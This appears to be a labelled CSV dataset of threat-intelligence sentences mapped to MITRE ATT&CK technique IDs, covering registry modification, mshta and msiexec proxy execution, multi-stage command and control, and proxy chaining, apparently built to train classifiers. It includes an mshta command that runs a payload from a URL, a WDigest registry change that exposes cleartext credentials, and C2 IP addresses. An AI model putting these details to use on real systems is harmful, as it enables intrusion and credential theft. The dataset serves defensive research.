,sentence,label_tec
6247,APT32's backdoor has modified the Windows Registry to store the backdoor's configuration.,T1112
6248,Turla has used the Registry to store encrypted payloads.,T1112
6249,APT41 used a malware variant called GOODLUCK to modify the registry in order to steal credentials.,T1112
6250,"Silence can create, delete, or modify a specified Registry key or value.",T1112
6251,Wizard Spider has modified the Registry key HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest by setting the UseLogonCredential registry value to 1 in order to force credentials to be stored in clear text in memory.,T1112
6252,Blue Mockingbird has used Windows Registry modifications to specify a DLL payload.,T1112
6253,Gamaredon Group has removed security settings for VBA macro execution by changing registry values HKCU\Software\Microsoft\Office\&lt;version&gt;\&lt;product&gt;\Security\VBAWarnings and HKCU\Software\Microsoft\Office\&lt;version&gt;\&lt;product&gt;\Security\AccessVBOM.,T1112
6254,Kimsuky has modified Registry settings for default file associations to enable the opening of malicious documents.,T1112
6255,Operation Wocao has enabled Wdigest by changing the registry value from 0 to 1.,T1112
6256,Lazarus Group has modified registry keys using the reg windows utility for its custom backdoor implants.,T1112
6257,Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.,T1601
6258,"On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file.",T1601
6259,"To change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it.",T1601
6260,"This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device.",T1601
6261,Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility.,T1218
6262,"There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code      
Mshta.exe is a utility that executes Microsoft HTML Applications  files.",T1218
6263,"HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.",T1218
6264,"Files may be executed by mshta.exe through an inline script: mshta vbscript:Close""
They may also be executed directly from URLs: mshta http://webserver/payload.hta
Mshta.exe can be used to bypass application control solutions that do not account for its potential use.",T1218
6265,"Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.",T1218
6266,NanHaiShu uses mshta.exe to load its program and files.,T1218
6267,POWERSTATS can use Mshta.exe to execute additional payloads on compromised hosts.,T1218
6268,Xbash can use mshta for executing scripts.,T1218
6269,Revenge RAT uses mshta.exe to run malicious scripts on the system.,T1218
6270,Metamorfo has used mshta.exe to execute a HTA payload.,T1218
6271,BabyShark has used mshta.exe to download and execute applications from a remote server.,T1218
6272,Sibot has been executed via MSHTA application.,T1218
6273,FIN7 has used mshta.exe to execute VBScript to execute malicious code on victim systems.,T1218
6274,APT32 has used mshta.exe for code execution.,T1218
6275,MuddyWater has used mshta.exe to execute its POWERSTATS payload and to pass a PowerShell one-liner for execution.,T1218
6276,Kimsuky has used mshta.exe to run malicious scripts on the system.,T1218
6277,Inception has used malicious HTA files to drop and execute malware.,T1218
6278,Sidewinder has used mshta.exe to execute malicious payloads.,T1218
6279,TA551 has used mshta.exe to execute malicious payloads.,T1218
6280,Mustang Panda has used mshta.exe to launch collection scripts.,T1218
6281,Lazarus Group has used mshta.exe to run malicious scripts and download programs.,T1218
6282,Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.,T1218
6283,Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages .,T1218
6284,Msiexec.exe is digitally signed by Microsoft.,T1218
6285,Adversaries may abuse msiexec.exe to launch local or network accessible MSI files.,T1218
6286,Msiexec.exe can also execute DLLs.,T1218
6287,"Since it is signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse.",T1218
6288,Msiexec.exe execution may also be elevated to SYSTEM privileges if the AlwaysInstallElevated policy is enabled.,T1218
6289,Duqu has used msiexec to execute malicious Windows Installer packages.,T1218
6290,"Additionally, a PROPERTY=VALUE pair containing a 56-bit encryption key has been used to decrypt the main payload from the installer packages.",T1218
6291,LoudMiner used an MSI installer to install the virtualization software.,T1218
6292,Ragnar Locker has been delivered as an unsigned MSI package that was executed with msiexec.exe.,T1218
6293,IcedID can inject itself into a suspended msiexec.exe process to send beacons to C2 while appearing as a normal msi application.,T1218
6294,"Maze has delivered components for its ransomware attacks using MSI files, some of which have been executed from the command-line using msiexec.",T1218
6295,Metamorfo has used MsiExec.exe to automatically execute files.,T1218
6296,Javali has used the MSI installer to download and execute malicious payloads.,T1218
6297,Melcoz can use MSI files with embedded VBScript for execution.,T1218
6298,Grandoreiro can use MSI files to execute DLLs.,T1218
6299,AppleJeus has been installed via MSI installer.,T1218
6300,Chaes has used .MSI files as an initial way to start the infection chain.,T1218
6301,Clop can use msiexec.exe to disable security tools on the system.,T1218
6302,QakBot can use MSIExec to spawn multiple cmd.exe processes.,T1218
6303,Rancor has used msiexec to download and execute malicious installer files over HTTP.,T1218
6304,TA505 has used msiexec to download and execute malicious Windows Installer files.,T1218
6305,Machete has used msiexec to install the Machete malware.,T1218
6306,Molerats has used msiexec.exe to execute an MSI payload.,T1218
6307,ZIRCONIUM has used the msiexec.exe command-line utility to download and execute malicious MSI files.,T1218
6308,Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions.,T1104
6309,Use of multiple stages may obfuscate the command and control channel to make detection more difficult.,T1104
6310,Remote access tools will call back to the first-stage command and control server for instructions.,T1104
6311,"The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files.",T1104
6312,A second remote access tool  could be uploaded at that point to redirect the host to the second-stage command and control server.,T1104
6313,The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.,T1104
6314,The different stages will likely be hosted separately with no overlapping infrastructure.,T1104
6315,The loader may also have backup first-stage callbacks or Fallback Channels in case the original first-stage communication path is discovered and blocked.,T1104
6316,"BACKSPACE attempts to avoid detection by checking a first stage command and control server to determine if it should connect to the second stage server, which performs ""louder"" interactions with the malware.",T1104
6317,BLACKCOFFEE uses Microsoft’s TechNet Web portal to obtain an encoded tag containing the IP address of a command and control server and then communicates separately with that IP address for C2.,T1104
6318,"If the C2 server is discovered or shut down, the threat actors can update the encoded IP address on TechNet to maintain control of the victims’ machines.",T1104
6319,"After initial compromise, Chaos will download a second stage to establish a more permanent presence on the affected system.",T1104
6320,Valak can download additional modules and malware capable of using separate C2 channels.,T1104
6321,The Bazar loader is used to download and execute the Bazar backdoor.,T1104
6322,"An APT3 downloader first establishes a SOCKS5 connection to 192.157.198.103 using TCP port 1913; once the server response is verified, it then requests a connection to 192.184.60.229 on TCP port 81.",T1104
6323,"MuddyWater has used one C2 to obtain enumeration scripts and monitor web logs, but a different C2 to send data back.",T1104
6324,APT41 used the storescyncsvc.dll BEACON backdoor to download a secondary backdoor.,T1104
6325,"To disguise the source of malicious traffic, adversaries may chain together multiple proxies.",T1090
6326,"Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy.",T1090
6327,This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.,T1090
